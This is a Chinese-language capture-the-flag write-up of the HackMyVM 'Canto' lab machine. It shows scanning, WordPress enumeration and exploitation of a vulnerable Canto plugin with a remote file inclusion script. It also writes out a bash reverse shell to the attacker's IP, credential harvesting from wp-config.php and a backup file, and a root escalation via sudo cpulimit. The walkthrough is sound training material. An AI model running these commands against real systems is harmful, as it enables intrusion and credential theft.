---
{"dg-publish":true,"title":"hackmyvm_canto","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_canto.md","permalink":"/安全/靶机/hackmyvm_canto/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 192.168.124.27
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.124.1   88:2a:5e:21:1b:ef       New H3C Technologies Co., Ltd
192.168.124.8   10:a5:1d:71:1b:f5       Intel Corporate
192.168.124.37  08:00:27:34:62:6c       PCS Systemtechnik GmbH
192.168.124.7   4e:f4:82:76:df:78       (Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.601 seconds (98.42 hosts/sec). 4 responded

┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.124.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 21:11 EST
Nmap scan report for 192.168.124.37 (192.168.124.37)
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:34:62:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds
```

```sh
┌──(root㉿kali)-[~]
└─# nmap -sT -sC -sV -O -p22,80 192.168.124.37                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 21:13 EST
Nmap scan report for 192.168.124.37 (192.168.124.37)
Host is up (0.0048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
|_http-generator: WordPress 6.5.3
|_http-title: Canto
|_http-server-header: Apache/2.4.57 (Ubuntu)
MAC Address: 08:00:27:34:62:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.52 seconds

```


# 初步渗透

目录扫描

```sh
┌──(root㉿kali)-[~]
└─# dirb http://192.168.124.37/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Feb 10 21:14:26 2025
URL_BASE: http://192.168.124.37/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.37/ ----
+ http://192.168.124.37/index.php (CODE:503|SIZE:2449)
+ http://192.168.124.37/server-status (CODE:403|SIZE:279)
==> DIRECTORY: http://192.168.124.37/wp-admin/
==> DIRECTORY: http://192.168.124.37/wp-content/
==> DIRECTORY: http://192.168.124.37/wp-includes/
+ http://192.168.124.37/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://192.168.124.37/wp-admin/ ----
+ http://192.168.124.37/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.124.37/wp-admin/css/
==> DIRECTORY: http://192.168.124.37/wp-admin/images/
==> DIRECTORY: http://192.168.124.37/wp-admin/includes/
+ http://192.168.124.37/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.124.37/wp-admin/js/
==> DIRECTORY: http://192.168.124.37/wp-admin/maint/
==> DIRECTORY: http://192.168.124.37/wp-admin/network/
==> DIRECTORY: http://192.168.124.37/wp-admin/user/

---- Entering directory: http://192.168.124.37/wp-content/ ----

```

可以看到这里面有一个wordpress站点

先看一下用户：
```sh
┌──(root㉿kali)-[~]
└─# wpscan --url http://192.168.124.37 -e u --api-token Kp3RpsNnRac0ig3CNAme8iSKIwEzNAx0aXcsl1eu6fQ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.124.37/ [192.168.124.37]
[+] Started: Mon Feb 10 21:24:47 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.124.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.124.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.124.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.124.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.124.37/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://192.168.124.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.124.37/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.124.37/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://192.168.124.37/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.124.37/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===========> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.124.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Mon Feb 10 21:25:01 2025
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 14.396 KB
[+] Data Received: 236.468 KB
[+] Memory used: 164.602 MB
[+] Elapsed time: 00:00:13

```

有用户名：
```txt
erik
```


扫一下插件

```
wpscan --url http://192.168.124.37 -e ap --plugins-detection mixed --disable-tls-checks --api-token <api>

...
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.124.37/wp-content/plugins/akismet/
 | Last Updated: 2025-02-04T21:01:00.000Z
 | Readme: http://192.168.124.37/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/akismet/readme.txt

[+] canto
 | Location: http://192.168.124.37/wp-content/plugins/canto/
 | Last Updated: 2024-07-17T04:18:00.000Z
 | Readme: http://192.168.124.37/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.0.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/canto/, status: 200
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Canto <= 3.0.8 - Unauthenticated Blind SSRF
 |     References:
 |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063
 |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0
 |
 | [!] Title: Canto < 3.0.5 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452
 |
 | [!] Title: Canto < 3.0.7 - Unauthenticated RCE
 |     Fixed in: 3.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096
 |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability
 |
 | [!] Title: Canto < 3.0.9 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338
 |
 | Version: 3.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/canto/readme.txt
 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.124.37/wp-content/plugins/canto/package.json, Match: '3.0.4'

...

```

可以看到有个脚本`canto`有很多漏洞，看一下利用脚本
![Pasted image 20250211104847.png](/img/user/picture/Pasted%20image%2020250211104847.png)

看到有一个rce
```sh
┌──(root㉿kali)-[~/workspace/pentest/canto]
└─# searchsploit -m php/webapps/51826.py
  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /root/workspace/pentest/canto/51826.py

┌──(root㉿kali)-[~/workspace/pentest/canto]
└─# python3 51826.py -h
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]
...

┌──(root㉿kali)-[~/workspace/pentest/canto]
└─# python3 51826.py -u http://192.168.124.37/ -LHOST 192.168.124.27 -c "whoami"
Exploitation URL: http://192.168.124.37//wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.124.27:8080&cmd=whoami
Local web server on port 8080...
192.168.124.37 - - [10/Feb/2025 21:51:27] "GET /wp-admin/admin.php HTTP/1.1" 200 -
Server response:
www-data

Shutting down local web server...

```

看到可以正常执行，尝试执行反弹shell
 
```sh
┌──(root㉿kali)-[~/workspace/pentest/canto]
└─# python3 51826.py -u http://192.168.124.37/ -LHOST 192.168.124.27 -c 'bash%20-c%20%22exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.124.27%2F1234%20%3C%261%22'
Exploitation URL: http://192.168.124.37//wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.124.27:8080&cmd=bash%20-c%20%22exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.124.27%2F1234%20%3C%261%22
Local web server on port 8080...
192.168.124.37 - - [10/Feb/2025 21:57:03] "GET /wp-admin/admin.php HTTP/1.1" 200 -
```

```

┌──(root㉿kali)-[~/sharedir]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.124.27] from (UNKNOWN) [192.168.124.37] 54614
bash: cannot set terminal process group (862): Inappropriate ioctl for device
bash: no job control in this shell
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$
```


# 提权

`/etc/passwd`没啥信息，有用户名：`erik`

看一下网站配置文件
```sh
www-data@canto:/var/www/html$ cat wp-config.php
...
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
...
```


在用户文件夹中有信息：
```sh
www-data@canto:/home/erik/notes$ ls -al
ls -al
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day1.txt
cat Day1.txt
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt
cat Day2.txt
I almost lost the database with my user so I created a backups folder.

```

提示有一个`backups`文件夹
```sh
www-data@canto:/$ find / -name 'backups' 2>/dev/null
find / -name 'backups' 2>/dev/null
/snap/core22/1380/var/backups
/snap/core22/1748/var/backups
/var/backups
/var/wordpress/backups
www-data@canto:/$ cd /var/wordpress/backups
cd /var/wordpress/backups
www-data@canto:/var/wordpress/backups$ ls
ls
12052024.txt
www-data@canto:/var/wordpress/backups$ cat 12052024.txt
cat 12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------

```



得到密码
```sh
www-data@canto:/var/wordpress/backups$ su erik
su erik
Password: th1sIsTheP3ssw0rd!

erik@canto:/var/wordpress/backups$ id
id
uid=1001(erik) gid=1001(erik) groups=1001(erik)



erik@canto:~$ cat user.txt
cat user.txt
d41d8cd98f00b204e9800998ecf8427e


```


# 提权-2


```sh
erik@canto:~$ sudo -l
sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
erik@canto:~$ sudo /usr/bin/cpulimit -l 100 -f /bin/sh
sudo /usr/bin/cpulimit -l 100 -f /bin/sh
Process 1131 detected
# id
id
uid=0(root) gid=0(root) groups=0(root)

```

https://gtfobins.github.io/gtfobins/cpulimit/

![Pasted image 20250213133053.png](/img/user/picture/Pasted%20image%2020250213133053.png)


```sh
# cat root.txt
cat root.txt
1b56eefaab2c896e57c874a635b24b49
```


# 总结

要多去寻找一些有用信息





